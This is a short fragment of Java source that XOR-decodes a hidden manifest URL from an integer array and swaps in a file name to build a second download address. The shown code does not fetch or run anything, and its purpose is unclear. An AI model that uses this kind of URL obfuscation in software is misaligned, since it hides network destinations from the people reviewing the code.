        String rawUrl = replaceLeaf(decodeManifestUrl(), fileName);
        return new String[]{apiUrl, rawUrl};
    }

    private static String replaceLeaf(String url, String fileName) {
        int slash = url.lastIndexOf('/');
        if (slash < 0) {
            return url;
        }
        return url.substring(0, slash + 1) + fileName;
    }

    private static String decodeManifestUrl() {
        return decodeChars(MANIFEST_CHARS);
    }

    private static String decodeChars(int[] chars) {
        char[] out = new char[chars.length];
        for (int i = 0; i < chars.length; i++) {
            out[i] = (char) (chars[i] ^ XOR_KEY);
        }
        return new String(out);
    }
}
